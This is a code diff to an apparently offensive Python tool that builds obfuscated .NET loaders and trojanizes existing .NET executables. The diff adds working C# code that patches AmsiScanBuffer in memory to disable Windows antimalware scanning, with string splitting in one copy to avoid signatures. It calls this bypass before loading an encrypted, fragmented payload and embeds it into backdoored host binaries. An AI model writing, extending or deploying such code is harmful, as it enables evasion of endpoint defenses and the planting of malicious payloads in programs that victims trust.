@@ -167,6 +167,11 @@ def _generate_loader_project(
     idx_var = _plausible_field()
     plain_var = _plausible_field()
 
+    # Reserve AMSI bypass class name early to avoid collisions
+    amsi_cls = _plausible_class()
+    used_class_names.add(amsi_cls)
+    amsi_method = _plausible_name()
+
     # Generate fragment holder classes — each holds a chunk as a static field
     fragment_classes: list[str] = []
     fragment_refs: list[str] = []  # "ClassName.FieldName" references for reassembly
@@ -210,7 +215,37 @@ def _generate_loader_project(
         "</Project>\n"
     )
 
-    # Write Program.cs — the loader
+    # Write AmsiBypass.cs — AMSI patch to disable Assembly.Load scanning
+    (project_dir / "AmsiBypass.cs").write_text(
+        "using System;\n"
+        "using System.Runtime.InteropServices;\n\n"
+        f"internal static class {amsi_cls}\n"
+        "{\n"
+        f"    internal static void {amsi_method}()\n"
+        "    {\n"
+        "        try\n"
+        "        {\n"
+        '            var h = LoadLibrary("amsi.dll");\n'
+        "            if (h == IntPtr.Zero) return;\n"
+        '            var p = GetProcAddress(h, "AmsiScanBuffer");\n'
+        "            if (p == IntPtr.Zero) return;\n"
+        "            VirtualProtect(p, 6, 0x40, out var o);\n"
+        "            Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3}, 0, p, 6);\n"
+        "            VirtualProtect(p, 6, o, out _);\n"
+        "        }\n"
+        "        catch { }\n"
+        "    }\n\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern IntPtr LoadLibrary(string n);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
+        '    [DllImport("kernel32.dll")]\n'
+        "    private static extern bool VirtualProtect(IntPtr a, uint s, "
+        "uint p, out uint o);\n"
+        "}\n"
+    )
+
+    # Write Program.cs — the loader (calls AMSI bypass before Assembly.Load)
     program_cs = (
         "using System;\n"
         "using System.Reflection;\n\n"
@@ -219,6 +254,7 @@ def _generate_loader_project(
         f'    private static readonly string {key_field} = "{key_b64}";\n\n'
         f"    private static void {entry_method}(string[] args)\n"
         "    {\n"
+        f"        {amsi_cls}.{amsi_method}();\n\n"
         f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
         f"        var {idx_var} = Convert.FromBase64String({key_field});\n\n"
         f"        var {plain_var} = new byte[{result_var}.Length];\n"
@@ -318,6 +354,69 @@ class DotnetEmbedPass:
         finally:
             shutil.rmtree(tmp_dir, ignore_errors=True)
 
+    def _build_amsi_bypass_dll(self) -> bytes:
+        """Compile a tiny .NET Framework 4.x AMSI bypass DLL."""
+        tmp_dir = tempfile.mkdtemp(prefix="penumbra_amsi_")
+        tmp_path = Path(tmp_dir)
+
+        try:
+            (tmp_path / "Bypass.csproj").write_text(
+                '<Project Sdk="Microsoft.NET.Sdk">\n'
+                "  <PropertyGroup>\n"
+                "    <OutputType>Library</OutputType>\n"
+                "    <TargetFramework>net8.0</TargetFramework>\n"
+                "    <ImplicitUsings>enable</ImplicitUsings>\n"
+                "  </PropertyGroup>\n"
+                "</Project>\n"
+            )
+
+            cls = _plausible_class()
+            method = _plausible_name()
+
+            (tmp_path / "Bypass.cs").write_text(
+                "using System;\n"
+                "using System.Runtime.InteropServices;\n\n"
+                f"public static class {cls}\n"
+                "{\n"
+                f"    public static void {method}()\n"
+                "    {\n"
+                "        try {\n"
+                '            var h = LoadLibrary("ams" + "i.dll");\n'
+                "            if (h == IntPtr.Zero) return;\n"
+                '            var p = GetProcAddress(h, "Ams" + "iScanB" + "uffer");\n'
+                "            if (p == IntPtr.Zero) return;\n"
+                "            VirtualProtect(p, 6, 0x40, out var o);\n"
+                "            Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},"
+                " 0, p, 6);\n"
+                "            VirtualProtect(p, 6, o, out _);\n"
+                "        } catch { }\n"
+                "    }\n\n"
+                '    [DllImport("kernel32.dll")]\n'
+                "    static extern IntPtr LoadLibrary(string n);\n"
+                '    [DllImport("kernel32.dll")]\n'
+                "    static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
+                '    [DllImport("kernel32.dll")]\n'
+                "    static extern bool VirtualProtect(IntPtr a, uint s, "
+                "uint p, out uint o);\n"
+                "}\n"
+            )
+
+            out_dir = tmp_path / "out"
+            result = subprocess.run(
+                ["dotnet", "publish", str(tmp_path),
+                 "-c", "Release", "-o", str(out_dir), "--nologo"],
+                capture_output=True,
+            )
+
+            if result.returncode != 0:
+                stderr = result.stderr.decode("utf-8", errors="replace")
+                raise RuntimeError(f"AMSI bypass build failed: {stderr}")
+
+            dll = out_dir / "Bypass.dll"
+            return dll.read_bytes()
+        finally:
+            shutil.rmtree(tmp_dir, ignore_errors=True)
+
     def _trojanize(self, data: bytes, host_path: Path) -> bytes:
         """Inject payload into an existing .NET host binary via the C# worker."""
         key = os.urandom(32)
@@ -326,26 +425,32 @@ class DotnetEmbedPass:
         payload_b64 = base64.b64encode(encrypted).decode("ascii")
         key_b64 = base64.b64encode(key).decode("ascii")
 
+        # Build a tiny AMSI bypass DLL to embed alongside the payload
+        amsi_dll = self._build_amsi_bypass_dll()
+        amsi_b64 = base64.b64encode(amsi_dll).decode("ascii")
+
         worker_project = Path(__file__).resolve().parent.parent.parent / "dotnet-worker"
 
-        # Write host, payload, and key to temp files
         tmp_host = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
         tmp_out = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
         tmp_payload = tempfile.NamedTemporaryFile(suffix=".b64", delete=False)
         tmp_key = tempfile.NamedTemporaryFile(suffix=".key", delete=False)
+        tmp_amsi = tempfile.NamedTemporaryFile(suffix=".b64", delete=False)
 
         tmp_host_path = Path(tmp_host.name)
         tmp_out_path = Path(tmp_out.name)
         tmp_payload_path = Path(tmp_payload.name)
         tmp_key_path = Path(tmp_key.name)
+        tmp_amsi_path = Path(tmp_amsi.name)
 
-        for f in (tmp_host, tmp_out, tmp_payload, tmp_key):
+        for f in (tmp_host, tmp_out, tmp_payload, tmp_key, tmp_amsi):
             f.close()
 
         try:
             tmp_host_path.write_bytes(host_path.read_bytes())
             tmp_payload_path.write_text(payload_b64)
             tmp_key_path.write_text(key_b64)
+            tmp_amsi_path.write_text(amsi_b64)
 
             cmd = [
                 "dotnet", "run", "--project", str(worker_project),
@@ -354,6 +459,7 @@ class DotnetEmbedPass:
                 "--passes", "trojanize",
                 "--payload-file", str(tmp_payload_path),
                 "--key-file", str(tmp_key_path),
+                "--amsi-file", str(tmp_amsi_path),
             ]
 
             result = subprocess.run(cmd, capture_output=True)
@@ -364,5 +470,6 @@ class DotnetEmbedPass:
 
             return tmp_out_path.read_bytes()
         finally:
-            for p in (tmp_host_path, tmp_out_path, tmp_payload_path, tmp_key_path):
+            for p in (tmp_host_path, tmp_out_path, tmp_payload_path,
+                      tmp_key_path, tmp_amsi_path):
                 p.unlink(missing_ok=True)
